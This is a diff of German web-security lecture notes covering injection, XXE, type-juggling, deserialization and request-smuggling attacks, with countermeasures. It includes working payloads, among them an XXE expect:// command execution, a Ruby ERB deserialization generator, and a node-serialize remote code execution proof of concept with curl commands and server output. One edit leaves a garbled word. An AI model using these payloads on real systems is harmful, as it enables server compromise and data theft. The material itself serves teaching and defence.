+Eine weitere Gegenmaßnahme sind \textit{Stored Procedures}\index{Stored Procedures}. Dies sind Funktionen die im Datenbanksystem abgelegt und von der Applikation aufgerufen werden. Eine früher häufig genutzte Sprache zum Erstellen von Stored Procedures ist PL/SQL, mittlerweile können Stored Procedures auch in ``normalen'' Programmiersprachen entwickelt werden. Sie besitzen die gleichen Probleme wie applikatorische Abfragen: falls eine String-Verkettung verwendet wird, können SQL-Injections durchgeführt werden. Stored Procedures sind aber eher auf die Verwendung von Sprachmustern ausgelegt, die Injection-Angriffe vermeiden (ähnlich wie Prepared Statements) und da sie meistens von Datenbank-Spezialisten geschrieben werden, sind sie meistens sicher implementiert. Aus diesem Grund werden Stored Procedures häufig als Gegenmaßnahme zu SQL-Injections angeführt, auch wenn dies potentiell vom implementierenden Programmierer abhängig ist. Ein Nachteil von Stored Procedures ist, dass der Applikationscode dadurch auf den Applikationsserver und den Datenbankserver aufgeteilt wird und dadurch potentiell schwerer wartbar wird.
 
 \subsection{Object-Relational Mapping}
+\index{SQL-Injection!Object-Relational Mapping}
+\index{ORM}
 
 Object-Relational Mapping (ORM) wird verwendet um basierend auf einer relationalen Datenbank eine virtuelle Objektdatenbank zu erstellen. Dabei wird eine ORM-Software verwendet, um aus Datenbank-Zeilen eine Repräsentation der Daten als Programmiersprachen-Objekt herzustellen. Datenabfragen und -veränderungsoperationen werden anschließend auf dieser Objekt-Repräsentation durchgeführt und intern als Datenbankbefehle ausgeführt.
 
-Ein häufiges Pattern in diesem Umfeld ist das ActiveRecord-Pattern. Bei diesem entspricht eine Datenbanktabelle einem Objekttypen und eine Zeile innerhalb der Datenbank wird zu einer Objectinstanz. Beispielsweise würde aus der Datenbanktabelle \textit{users} die Klasse \textit{User} gebildet werden. Eine Zeile der Datenbank würde zu einer Objektinstanz und z. B. die Spalte \textit{vorname} würde zum Feld \textit{vorname} des Objekts werden.
+Ein häufiges Pattern in diesem Umfeld ist das ActiveRecord-Pattern. Bei diesem entspricht eine Datenbanktabelle einem Objekttypen und eine Zeile innerhalb der Datenbank wird zu einer Objectinstanz.B.ispielsweise würde aus der Datenbanktabelle \textit{users} die Klasse \textit{User} gebildet werden. Eine Zeile der Datenbank würde zu einer Objektinstanz und z.B. die Spalte \textit{vorname} würde zum Feld \textit{vorname} des Objekts werden.
 
 Bei den meisten ORMs werden Abfragen innerhalb der Zielprogrammiersprache abgebildet, hier ein Beispiel in JavaScript unter Verwendung des ORMs \textit{sequalize}:
 
@@ -320,6 +332,8 @@ models.Items.findAll({
 An den Limit-Parameter wird eine Stacked-Query angehängt und auf diese Weise eine SQL-Injection ausgeführt. Anhand diese Beispiels kann erkannt werden, das ORMs kein Allheilmittel für SQL-Injections sind.
 
 \subsection{NoSQL-Injections}
+\index{SQL-Injection!NoSQL}
+\index{NoSQL}
 
 In den letzten Jahren werden vermehrt NoSQL-Datenbanken eingesetzt. Diese verwenden nicht SQL als Abfragesprache, sondern meistens eigenständige Abfragesprachen oder exekutieren JavaScript-Snippets als Query. Hier ein Beispiel in MongoDB:
 
@@ -329,7 +343,7 @@ db.myCollection.find( { active: true, $where: function() { return obj.credits - 
 
 Bei diesem Beispiel wird als Query der aktuellen Kontostand berechnet (\textit{credits - debits}), falls dieser unter einer benutzerdefinierten Schranke liegt (\textit{\$userInput}) wird der behalten, ansonsten ausgefiltert. Die Abfrage ist als JavaScript implementiert und nicht als SQL.
 
-Die grundsätzliche Problematik einer Injection bleibt ident. In dem gewählten Beispiel wird z. B. die Benutzereingabe nicht escaped, ein Angreifer kann daher auf diese Weise Schadcode einfügen:
+Die grundsätzliche Problematik einer Injection bleibt ident. In dem gewählten Beispiel wird z.B. die Benutzereingabe nicht escaped, ein Angreifer kann daher auf diese Weise Schadcode einfügen:
 
 \begin{minted}{javascript}
 "(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()"
@@ -340,6 +354,7 @@ Hier wird nun innerhalb der Abfrage eine Javascript-Funktion definiert und sofor
 Wie man an dem Beispiel sehen kann, ist der alleinige Einsatz von NoSQL-Datenbanken nicht ausreichend um eine Datenbank-Injection zu vermeiden.
 
 \section{LDAP-Injections}
+\index{LDAP-Injections}
 
 Das Lightweight Directory Access Protocol (LDAP) ist ein standardisiertes Protokoll welches aktuell häufig für den Zugriff auf Identifikations und Authentikationsdaten verwendet wird. Ein Angreifer kann hier, ähnlich zu Datenbank-Injections, das Verketten von Strings als Angriffsvektor verwenden.
 
@@ -361,7 +376,7 @@ Abfragen werden in prefix Notation geschrieben, folgende Abfrage sucht alle Name
 (cn=Andreas*)
 \end{minted}
 
-Mehrere Abfragen können mit logsischen Operatoren verknüpft werden, z. B. sucht folgendes nach einem Namen der mit `Andreas'' beginnt und mit `Happe'' endet:
+Mehrere Abfragen können mit logsischen Operatoren verknüpft werden, z.B. sucht folgendes nach einem Namen der mit `Andreas'' beginnt und mit `Happe'' endet:
 
 \begin{minted}{text}
 (&(cn=Andreas*)(cn=*Happe))
@@ -385,29 +400,34 @@ Es entsteht eine Abfrage mit zwei Teilen die Und-verknüpft werden. Der erste Pa
 
 Weiter Informationen können dem Blog der Netsparker-Homepage\footnote{\url{https://www.netsparker.com/blog/web-security/ldap-injection-how-to-prevent/}} entnommen werden.
 
-\section{Type Juggling Angriffe}
-\index{type juggling attacks}
+\section{Type-Juggling Angriffe}
+\index{Type-Juggling Attacks}
 
 Type Juggling Angriffe können in mehreren Programmiersprachen auftreten, besonders ``bekannt'' ist dieser Angriffsvektor in PHP. Diese Angriffe sind möglich, wenn durch eine automatische, implizite Typkonvertierung das erwartete Resultat einer Operation verfälscht wird. In PHP liegt das Grundproblem in den beiden Vergleichsoperatoren \textit{==} (loose) und \textit{===} (strict), ersterer führt automatisch Typkonvertierungen durch und wird leider häufig anstatt des sicheren zweiten Operators verwendet.
 
-Wird z. B. server-seitig in PHP ein String mit einer Zahl verglichen, wird der String automatisch in eine Zahl konvertiert, dies inkludiert Hex- und Octal-Darstellungen von Zahlen:
+Wird z.B. server-seitig in PHP ein String mit einer Zahl verglichen, wird der String automatisch in eine Zahl konvertiert, dies inkludiert Hex- und Octal-Darstellungen von Zahlen:
 
-\begin{tabularx}{\textwidth}{|X|X|X|}
-	\hline
+\begin{table}[H]
+	\begin{center}
+\begin{tabular}{lll}
+	\toprule
 	Operant A & Operant B & Ergebnis \\
-	\hline
+	\midrule
 	"0000" & int(0) & true \\
 	"0e42" & int(0) & true \\
 	"1abc" & int(1) & true \\
 	"abc"  & int(0) & true \\
 	"0xF"  & "15"   & true \\
 	"0e1234" & "0e5678" & true \\
-	\hline
-\end{tabularx}
+	\bottomrule
+\end{tabular}
+\end{center}
+\end{table}
 
 Dies kann verwendet werden, um Vergleiche ``kurzzuschließen'', wie folgendes Beispiel (aus einer älteren WordPress-Version) zeigen soll. Hier wird die Benutzerauthorisierung über einen berechneten MAC durchgeführt. Der Anwender setzt mehrere Werte über Cookies, die Integrität dieser Werte wird durch einen berechneten MAC verifiziert. Zur Berechnung des MACs wird ein geheimer Schlüssel (\textit{key} in dem Beispiel) verwendet, der nie den Server verlässt. Dies wird vereinfacht durch folgenden server-seitigen Code umgesetzt:
 
-\begin{minted}{PHP}
+\begin{listing}[H]
+\begin{minted}{php}
 $hash = hash_mac('md5', $username . '|' . $expiration, $key);
 if ($hmac != $hash) {
 	// bad cookie, give error
@@ -415,15 +435,17 @@ if ($hmac != $hash) {
 	// accept operation
 }
 \end{minted}
+\end{listing}
 
 \textit{username}, \textit{expiration} und \textit{hmac} werden aus dem Cookie gelesen und können dadurch durch den Angreifer bestimmt werden. Ein Angreifer kann nun \textit{username} auf \textit{Administrator}, und \textit{hmac} auf den Wert \textit{0} setzen. Nun kann er einen Brute-Force Angriff ausführen, bei dem das Ablaufdatem (\textit{expiration}) au feinen zufälligen Wert gesetzt wird. Der Angreifer hofft, dass bei einem der Zugriffe zufällig als Hash ein Wert generiert wird, der mit "0e\ldots" beginnt, da hier automatisch eine Konvertierung des Wertes auf \textit{0} passieren würde. Dies entspricht dem übergebenen \textit{hmac} (der ebenso \textit{0}) ist und eine server-seitige Administratoren-Identität ist übernommen.
 
-\section{XML External Entities and DoS}
+\section{XML-basierte Angriffe}
+\index{XML}
 
 Werden von einem Webserver XML-Daten entgegengenommen und serverseitig bearbeitet, entstehen mehrere potentielle Angriffsvektoren. Zwei davon, XML External Entities und XML-basierte DoS-Angriffe, werden in diesem Kapitel betrachtet. Beide basieren darauf, dass XML ein komplexes Datenformat besitzt welches durch einen ebenso komplexen Parser serverseitig analysiert werden muss.
 
 \subsection{XML External Entities}
-\index{xee}
+\index{XML External Entitites}
 
 XML besitzt die Möglichkeit direkt innerhalb des XML-Dokuments Typdefinitionen zu inkludieren. Diese DTD (Document Type Definition) beginnt mit dem DOCTYPE Tag und kann auch External Entities definieren. Diese External Entities sind Verweise auf externe Datenquellen, diese werden durch den Parser automatisch in das XML-Dokument eingefügt.
 
@@ -454,13 +476,13 @@ Ebenso kann auf eine Netzwerkadresse verwiesen werden:
 In diesem Beispiel kann der Angreifer den XML-verarbeitenden Server dazu bringen, mittels HTTP GET auf die übergebene URL (\url{http://www.attacker.com/text.txt}) zuzugreifen. Dadurch ergeben sich mehrere Angriffsmöglichkeiten:
 
 \begin{itemize}
-	\item Der Angreifer kann den Webserver zum ``Besuch'' einer Webseite bringen, bei diesem Besuch wird zumeist auch die öffentliche IP-Adresse des Webservers auf dem besuchten Webserver vermerkt. Bei Inhalten die z. B. gegen das Verbotsgesetz verstoßen kann dies negative Publicity für den Betreiber des XML-verarbeitenden Webservers bewirken.
+	\item Der Angreifer kann den Webserver zum ``Besuch'' einer Webseite bringen, bei diesem Besuch wird zumeist auch die öffentliche IP-Adresse des Webservers auf dem besuchten Webserver vermerkt. Bei Inhalten die z.B. gegen das Verbotsgesetz verstoßen kann dies negative Publicity für den Betreiber des XML-verarbeitenden Webservers bewirken.
 	\item Da der Zugriff vom XML-verarbeitenden Server ausgeht, kann der Angreifer einen HTTP GET Request auf interne Server absetzen, die ansonsten durch eine initiale Firewall blockiert gewesen wären.
 	\item Der Angreifer kann ebenso auf \textit{localhost}, sprich dem eigenen Server, zugreifen. Häufig werden interne Administrationsprogramme so konfiguriert, dass diese nur auf Localhost lauschen (als Sicherheitsmassname um remote Angreifern den Zugriff zu unterbinden). Im Zuge eines XML External Entity basierten Angriffs kann ein Angreifer diesen Schutz aushebeln und direkt auf localhost zugreifen.
-	\item Bei einigen Protokollen (http, smb, cifs) werden automatisch Tokens und Credentials vom XML-verarbeitenden Server aus zum Zielserver verschickt. Ein Angreifer kann dies z. B. missbrauchen um bei einem Windows-basierten Server via SMB NTLM-Hashes zu extrahieren und gegen diese offline einen Brute-Force Angriff durchzuführen.
+	\item Bei einigen Protokollen (http, smb, cifs) werden automatisch Tokens und Credentials vom XML-verarbeitenden Server aus zum Zielserver verschickt. Ein Angreifer kann dies z.B. missbrauchen um bei einem Windows-basierten Server via SMB NTLM-Hashes zu extrahieren und gegen diese offline einen Brute-Force Angriff durchzuführen.
 \end{itemize}
 
-Ein XML External Entity kann auch auf virtuelle Adressen verweisen. So wird z. B. vom PHP XML Parser als Schema \textit{expect} angeboten. Bei diesem Schema wird die übergebene URL als Systemkommando ausgeführt und dessen Ergebnis in das XML-Dokument eingefügt. Ein Angreifer kann dies missbrauchen um Systemkommands (Command Injection) auszuführen:
+Ein XML External Entity kann auch auf virtuelle Adressen verweisen. So wird z.B. vom PHP XML Parser als Schema \textit{expect} angeboten. Bei diesem Schema wird die übergebene URL als Systemkommando ausgeführt und dessen Ergebnis in das XML-Dokument eingefügt. Ein Angreifer kann dies missbrauchen um Systemkommands (Command Injection) auszuführen:
 
 \begin{minted}{xml}
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -477,9 +499,10 @@ In diesem Fall wird als Benutzername die Ausgabe des UNIX-Systemkommandos \texti
 
 \subsection{Gegenmaßnahmen}
 
-Die bevorzugte Gegenmaßnahme ist es, den verwendeten Parser so zu konfigurieren, dass er keinen Zugriff auf XML External Entities zulässt. Häufig wird auch die Verwendung ``einfacherer'' Dokumentenformate als Gegenmaßnahme vorgeschlagen: dies ist allerdings IMHO nicht der beste Weg, da auch die Parser einfacher Dokumentenformate (wie z. B. CSV und JSON) ebenso Schwachstellen besitzen.
+Die bevorzugte Gegenmaßnahme ist es, den verwendeten Parser so zu konfigurieren, dass er keinen Zugriff auf XML External Entities zulässt. Häufig wird auch die Verwendung ``einfacherer'' Dokumentenformate als Gegenmaßnahme vorgeschlagen: dies ist allerdings IMHO nicht der beste Weg, da auch die Parser einfacher Dokumentenformate (wie z.B. CSV und JSON) ebenso Schwachstellen besitzen.
 
-\subsection{DoS Attacks}
+\subsection{Denial-of-Service Attacks}
+\index{XML External Entitites!Denial-of-Service Attacks}
 
 Ein weiteres Problem von External Entities ist es, dass hierdurch schnell tiefe und breite Datenstrukturen aufgebaut werden können. Versucht ein Parser nun diese Datenstruktur in-memory zu bauen, kann ein Parser sehr schnell out-of-memory gehen und dadurch einen Speicher-basierten DoS-Angriff durchführen.
 
@@ -505,7 +528,7 @@ Ein bekanntes Beispiel sind Million-Laugh Angriffe:
 Bei dieser Angriffsart wird LOL9 durch 10 Elemente des Types LOL8 ersetzt. Jedes dieser 10 LOL8 Elemente wird mit mit 10 LOL7 Elementen gebaut, etc. In Summe erzeugt dieses DTD rund drei Milliarden LOL Elemente. Falls ein Parser versucht diese im Arbeitsspeicher zu erstellen, wird dieser mit hoher Wahrscheinlichkeit nicht ausreichend sein.
 
 \section{Serialisierungsangriffe}
-\index{serilization attacks}
+\index{Serilization Attacks}
 
 Die Serialisierung dient dazu, aus einem Objekt einer Programmiersprache zur Laufzeit eine Textrepresentation zu erstellen. Diese kann dann gespeichert oder übertragen werden. Zu einem späteren Zeitpunkt kann aus dieser Textrepresentation wieder ein Programmiersprachen-Objekt erstellt und diese innerhalb einer Webapplikation verwendet werden.
 
@@ -521,7 +544,7 @@ a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f
 a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
 \end{minted}
 
-In dem Beispiel wird ein einfaches Serialisierungsformat verwendet, String Elemente werden in der Form \textit{s:Länge:Inhalt} verwendet. Ein Angreifer würde z. B. innerhalb des Browsers diese serialisierten Daten modifizieren und z. B. aus dem String ``user'' (Länge 4) den String ``admin'' (Länge 5) machen und versuchen auf diese Weise eine Privilege Escalation durchzuführen.
+In dem Beispiel wird ein einfaches Serialisierungsformat verwendet, String Elemente werden in der Form \textit{s:Länge:Inhalt} verwendet. Ein Angreifer würde z.B. innerhalb des Browsers diese serialisierten Daten modifizieren und z.B. aus dem String ``user'' (Länge 4) den String ``admin'' (Länge 5) machen und versuchen auf diese Weise eine Privilege Escalation durchzuführen.
 
 Weitaus schwerwiegendere Angriffe sind ebenso möglich:
 
@@ -529,6 +552,9 @@ Weitaus schwerwiegendere Angriffe sind ebenso möglich:
 	\item Es gibt in PHP (wie in den meisten Programmiersprachen) Methoden, die automatisch beim Erstellen bzw. Vernichten von Objekten aufgerufen werden. Ein Angreifer kann anstatt (wie bei dem angegeben Beispiel) einen Stringwert zu verändern, den Stringwert mit einem serialisierten Objekt ersetzen. Dieses Objekt muss nur eine (bei der Serialisierung automatisch aufgerufene) Methode besitzen, die auf eine Variable zugreift und diese als Code ausführt. Der Angreifer würde im serialisierten Objekt nun den Wert dieser Variable auf den Schadcode setzen und dadurch beim Deserialisieren eine serverseitige Code-Execution erzeugen.
 	\item Es können auch serialisierte Objekte mit Objektreferenzen gebaut werden. Problematisch ist, dass die referenzierten Objekte während der Deserialisierung auch Daten wieder freigeben können, man über die Objektreferenz allerdings noch auf diese zugreifen kann. Dies führt zu \textit{use-after-free} Bugs die für \textit{memory corruption}-basierte Angriffe ausgenutzt werden können.
 \end{itemize}
+
+\subsection{Serialisierungsangriffe in Java}
+\index{Serilization Attacks!Java}
 
 Serialisierung innerhalb des Java-Ökosystems besitzt das Problem, dass bei der Deserialisierung zuerst das de-serialisierte Objekt gebaut wird und erst danach der Typ, etc. des Objekts überprüft werden kann. Hier ein Beispiel:
 
@@ -538,7 +564,7 @@ ObjectInputStream ois = new ObjectInputStream(is);
 AcmeObject acme = (AcmeObject)ois.readObject();
 \end{minted}
 
-Dies bedeutet, dass die Java-Laufzeitumgebung initial aus einem nicht-vertrauenswürdigem Dokument ein neues Java-Objekt erstellen muss. Ein Angreifer kann dies z. B. für einen einfachen DoS missbrauchen. So erstellt folgender Java-Code z. B. mehrere Hashes die ineinander verknüpft werden. Während solch ein Konstrukt gebaut und serialisiert werden kann, ergibt dies eine rekursive Datenstruktur mit unendlichem Speicherverbrauch beim Deserialisieren und bringt dadurch das Java Runtime Environment zum Absturz:
+Dies bedeutet, dass die Java-Laufzeitumgebung initial aus einem nicht-vertrauenswürdigem Dokument ein neues Java-Objekt erstellen muss. Ein Angreifer kann dies z.B. für einen einfachen DoS missbrauchen. So erstellt folgender Java-Code z.B. mehrere Hashes die ineinander verknüpft werden. Während solch ein Konstrukt gebaut und serialisiert werden kann, ergibt dies eine rekursive Datenstruktur mit unendlichem Speicherverbrauch beim Deserialisieren und bringt dadurch das Java Runtime Environment zum Absturz:
 
 \begin{minted}{java}
 Set root = new HashSet();
@@ -558,9 +584,12 @@ for (int i = 0; i < 100; i++) {
 }
 \end{minted}
 
-Ruby (on Rails) besitzt leider auch eine längere Historie von Deserialiserungsangriffen. Ein Beispiel hierfür verwendet die Rails \textit{ERB} Klasse. Diese Klasse besitzt ein Element src in welchem Base64-codierter Source Code enthalten sein kann. Dieser Source Code wird bei Aufruf der Methode \textit{result} eines ERB-Objektes intern aufgerufen.
+\subsection{Serialisierungsangriffe in Ruby on Rails}
+\index{Serilization Attacks!Ruby on Rails}
 
-Ruby verwendet ein in XML-eingepacktes JSON-Dokument als Serialisierungsformat. Ein Angreifer könnte z. B. folgendes Dokument bauen, welches einem serialisierten ERB Objekt entspricht:
+Ruby (on Rails) besitzt eine längere Historie von Deserialiserungsangriffen. Ein Beispiel hierfür verwendet die Rails \textit{ERB} Klasse. Diese Klasse besitzt ein Element src in welchem Base64-codierter Source Code enthalten sein kann. Dieser Source Code wird bei Aufruf der Methode \textit{result} eines ERB-Objektes intern aufgerufen.
+
+Ruby verwendet ein in XML-eingepacktes JSON-Dokument als Serialisierungsformat. Ein Angreifer könnte z.B. folgendes Dokument bauen, welches einem serialisierten ERB Objekt entspricht:
 
 \begin{minted}{ruby}
 code  = File.read(ARGV[1])
@@ -578,15 +607,117 @@ PAYLOAD
 
 Der Code liest zuerst eine Payload aus einem File aus (der Pfad wird durch die Variable ARGV bereitgestellt) und erstellt dann ein Dokument welches ein serialisiertes ERB-Objekt beschreibt. Hier wurde nun src mit dem Schadcode befüllt und falls die Webapplikation, welche dieses serialisierte Objekt entgegen nimmt, nun das Objekt deserialisert und auf die \textit{result} Methode zugreift wird der bösartige Code des Angreifers ausgeführt. Dies entspricht einer Remote Command Injection, basierend auf einem Serialisierungsfehler.
 
+\subsection{Serialisierungsangriffe in Javascript / Node.js}
+\index{Serilization Attacks!JavaScript}
+
+Ein schönes Beispiel für Serialisierungsangriffe ist folgende \textit{node.js} Applikation welche die Serialisierungsbibliothek \textit{node-serialize} verwendet:
+
+\begin{minted}{javascript}
+const express = require('express');
+const bodyParser = require('body-parser');
+const serialize = require('node-serialize');
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+
+app.post("/api/deserialize", function(req, res) {
+	var str = ""+req.body.fubar;
+	  const todo = serialize.unserialize(str);
+	  console.log(todo);
+	  res.send("wohoo!");
+});
+
+const server = app.listen(3000, function() {
+	  console.log("Server started! (Express.js)");
+
+		// Beispiel eines "normalen" serialisierten Objekts
+		const normal = {
+			todo: "some string"
+		};
+	  console.log("serialized normal object" + serialize.serialize(normal));
+});
+\end{minted}
+
+Bei diesem Beispiel wird vom Server als Parameter ,,fubar'' ein serialisiertes Objekt als Text entgegen genommen, deserialisiert und ausgegeben. Das erwartete serialisierte Object wird nun über das Kommandozeilentool \textit{curl} an den Server übertragen:
+
+\begin{minted}{shell}
+$ curl -X POST -d "fubar={\"todo\":\"some string\"}" http://localhost:3000/api/deserialize
+
+# Ausgabe am Server:
+Server started! (Express.js)
+serialized normal object: {"todo":"some string"}
+serialized attack code: {"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}
+
+{ todo: 'some string' }
+\end{minted}
+
+In Javascript kann eine Klasse/Objekt auch eine Funktion als Element besitzen. Folgende Klasse inkludiert z.B. unter dem Namen ,,todo'' nicht ein Attribut, sondern eine ausführbare Funktion:
+
+\begin{minted}{javascript}
+	 	// Beispiel eines serialisierten Objekts mit einer aufrufbaren Funktion
+	  const todo = {
+			todo : function() {
+				// child_process kann verwendet werden um eine ausführbare Datei aufzurufen
+				require('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})
+			}
+		};
+\end{minted}
+
+Wird diese Klasse serialisiert, wird folgender serialisierter Text erstellt:
+
+\begin{minted}{text}
+{"todo":"_$$ND_FUNC$$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}"}
+\end{minted}
+
+Dieser inkludiert das Ausführen eines Befehls (,,ls /bin'') in der Hoffnung, dass beim deserialisieren dieser Befehl am Server aufgerufen werden würde. Dieses Kommando wird nun ebenso über curl an den Server übertragen:
+
+\begin{minted}{shell}
+# Die Zeichen \ und $ mussten teilweise maskiert werden
+$ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}\"}" http://localhost:3000/api/deserialize
+
+# Ausgabe am Server:
+
+{ todo: [Function (anonymous)] }
+\end{minted}
+
+Das Objekt wurde deserialisiert (inkl. der Methode mit dem Schadcode), würde diese Methode während der Request-Abarbeitung aufgerufen werden, würde unser Kommando am Server exekutiert werden. Wir können diesen Exploit noch verbessern indem wir durch Anhängen von ,,()'' nicht nur eine Funktion definieren, sondern diese auch direkt aufrufen. Dies würde folgendem serialiserten String bzw. folgendem Curl-Aufruf entsprechen:
+
+\begin{minted}{shell}
+$ curl -X POST -d "fubar={\"todo\":\"_\$\$ND_FUNC\$\$_function() {\n\t\t\t\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n\t\t\t}()\"}" http://localhost:3000/api/deserialize
+\end{minted}
+
+Die Ausgabe am Server zeigt nun, dass das Kommando ausgeführt, und der Inhalt von \textit{/bin} ausgegeben wurde:
+
+\begin{minted}{text}
+{ todo: undefined }                                                                                                                         
+[                                                                                                                                           
+2to3-2.7                                                              
+aa-enabled                                                                                                                                  
+aa-exec                                                               
+aa-features-abi                                                       
+aconnect                                                              
+acpi_listen                                                           
+add-apt-repository                                                    
+addpart                                                               
+addr2line                                                             
+afm2pl                                                                
+afm2tfm                                                               
+ag                                                                    
+aleph
+...
+\end{minted}
+
 \subsection{Gegenmaßnahmen}
 
-Die Grundidee ist es, dass der Entwickler vor der Deserialisierung definieren muss, welche validen Objekttypen bei der Deserialisierung vorkommen dürfen. Wie und ob dies überhaupt möglich ist, ist allerdings von der verwendeten Programmiersprache abhängig --- z. B. muss bei älteren Java-Versionen eine externe Serialisierungsbibliothek\footnote{\url{https://github.com/ikkisoft/SerialKiller}} verwendet werden um ein sicheres Verhalten zu erzielen.
+Die Grundidee ist es, dass der Entwickler vor der Deserialisierung definieren muss, welche validen Objekttypen bei der Deserialisierung vorkommen dürfen. Wie und ob dies überhaupt möglich ist, ist allerdings von der verwendeten Programmiersprache abhängig --- z.B. muss bei älteren Java-Versionen eine externe Serialisierungsbibliothek\footnote{\url{https://github.com/ikkisoft/SerialKiller}} verwendet werden um ein sicheres Verhalten zu erzielen.
 
-Zusätzlich müssen serialisierte Daten einer Integritätssicherung unterzogen werden (z. B. mittels einer Signatur oder eines MACs) damit ein Angreifer die serialisierten Daten nicht verändern kann.
+Zusätzlich müssen serialisierte Daten einer Integritätssicherung unterzogen werden (z.B. mittels einer Signatur oder eines MACs) damit ein Angreifer die serialisierten Daten nicht verändern kann.
 
 Da diese Sicherungsmassnahmen teilweise schwer umsetzbar sind, empfiehlt OWASP, dass Daten nur deserialisert werden dürfen, wenn diese aus einer authentischen und integritäts-geschützen Quelle kommen. Dadurch wird allerdings das Grundproblem nicht gelöst, sondern wird die Verantwortung und das Problem nur zu dem Anwender, der die Deserialisierung anstößt, verschoben. Falls ein Angreifer das Konto dieses Anwenders übernehmen kann, erlangt er wiederum die Möglichkeit eine Deserialisierungattacke durchzuführen.
 
 \subsection{HTTP Request Smuggling}
+\index{HTTP Request Smuggling}
 
 Bei HTTP Request Smuggling versucht der Angreifer, einzelne HTTP Requests in ein System einzuschleusen. Der Angriff erfolgt nicht direkt gegen eine Webapplikation an-sich, sondern nutzt aus, dass bei modernen Webapplikationen zumeist mehrere Server involviert sind.Das HTTP verwendet eine nicht-eindeutige Kodierung der Request-Länge, HTTP Request Smuggling tritt auf, wenn die verschiedenen Server bei dem indenten Request von unterschiedlichen Request-Längen ausgehen und daher diesen Request unterschiedlich zusammensetzen.
 
@@ -634,7 +765,7 @@ SMUGGLED
 
 Hier wird allerdings eine Zeile mit 0 zwischen dem eingeschleusten Request und dem dazu-kopierten Folgerequest eines anderen Benutzers eingefügt (da das Chunked-Encoding diese Zeile zum Beenden des Requests benötigt). Dies muss der Angreifer bei der Erstellung seines Angriffscodes berücksichtigen.
 
-Wie kann dieses Verhalten bei einem Angriff ausgenutzt werden? Ein schönes Beispiel wäre eine Webapplikation, bei dem ein Benutzer Kommentare absetzen kann. Das Registrieren eines Benutzers ist auch für einen Angreifer möglich. Hier könnte z. B. folgender Request als Angriff verwendet werden\footnote{Quelle: \url{https://portswigger.net/web-security/request-smuggling/exploiting}}:
+Wie kann dieses Verhalten bei einem Angriff ausgenutzt werden? Ein schönes Beispiel wäre eine Webapplikation, bei dem ein Benutzer Kommentare absetzen kann. Das Registrieren eines Benutzers ist auch für einen Angreifer möglich. Hier könnte z.B. folgender Request als Angriff verwendet werden\footnote{Quelle: \url{https://portswigger.net/web-security/request-smuggling/exploiting}}:
 
 \begin{minted}{http}
 GET / HTTP/1.1
@@ -662,7 +793,7 @@ Unter der Annahme, dass das Frontend \textit{Content-Length} und das Backend \te
 	\item Innerhalb des eingeschleusten Requests wird mit einem Request-Body begonnen. In diesem werden mehrere Parameter gesetzt. Der eingeschleuste Request endet mit einem \textit{comment=}, also dem Wert der als Kommentar vom User eingegeben werden sollte.
 	\item Da das Backend nicht weiss, dass der Request beendet ist, liest es die nächsten Daten aus der eingehenden Verbindung. In diesem Fall ist dies ein Request eines anderen Benutzers, der zeitgleich abgegeben und vom Frontend direkt nach dem eingeschleusten Reqeust in die Verbindung kopiert wurde.
 	\item Die Applikationslogik interpretiert nun den Folgerequest als Inhalt des Parameters \textit{comment}, also als Kommentar der als Kommetar gepostet werden sollte (da die Operation \url{/comment/post} war).
-	\item Der Angreifer überprüft nun, ob ein neuer Kommentar mit sensiblen Daten eines anderen Users an der betroffenen Stelle auftaucht. Sensible Daten könnte z. B. Credentials im Zuge einer Login-Operation oder auch ein HTTP-Header mit Session-Cookies sein. Falls möglich, würde der Angreifer diese Verwenden um serverseitig die Identität des anderen Benutzers anzunehmen.
+	\item Der Angreifer überprüft nun, ob ein neuer Kommentar mit sensiblen Daten eines anderen Users an der betroffenen Stelle auftaucht. Sensible Daten könnte z.B. Credentials im Zuge einer Login-Operation oder auch ein HTTP-Header mit Session-Cookies sein. Falls möglich, würde der Angreifer diese Verwenden um serverseitig die Identität des anderen Benutzers anzunehmen.
 	\item Falls kein Kommentar erscheint oder der Kommentar nur sinnlose Informationen beinhaltet, wiederholt der Angreifer den Angriffsrequest (potentiell würde er ein neues CSRF-Token initial generieren).
 \end{itemize}
 
@@ -675,15 +806,79 @@ Was kann man gegen HTTP Request Smuggling Angriffe unternehmen? Mehrere Möglich
 	\item Zwischen Front- und Backend HTTP/2 verwenden. Diese Protokollversion besitzt die Mehrdeutigkeit der Requestlängen nicht mehr.
 \end{itemize}
 
+\section{Server-Side Template Injection (SSTI)}
+\index{Server-Side Template Injection}
+
+Web-Applikationen verwenden Template-Engines um dynamische Inhalte zu präsentieren. Anstatt eine Seite starr zu kodieren, wird ein Template server-seitig in einer Datenbank gespeichert (z.B. als String/Text). Wird die Seite angezeigt, wird das Template mit den aktuellen Daten kombiniert und die resultierende Seite angezeigt. Häufig können eingeloggte Benutzer (im Folgenden  Autoren genannt) Templates server-seitig modifizieren und auf diese Weise das Layout modifizieren.
+
+Durch die Verwendung von Templates ergeben sich Vorteile:
+
+\begin{itemize}
+	\item Content-Autoren können Templates modifizieren (z.B. mittels eines WYSIWYG--Editor innerhalb des Administrationsbereichs) ohne auf den Source-Code der Applikation Zugriff zu benötigen.
+	\item Die verwendeten Template-Sprachen sind zumeist einfacher als ,,volle'' Programmiersprachen und können daher auch leichter angelernt werden und erlauben es so einem größeren Benutzerkreis die Inhalte der Webseite zu modifzieren.
+	\item Die Daten, auf welche ein Template zugreifen kann, können limitiert werden. Auf diese Weise können Content-Autoren nur auf ein Subset der server-seitigen Daten zugreifen.
+\end{itemize}
+
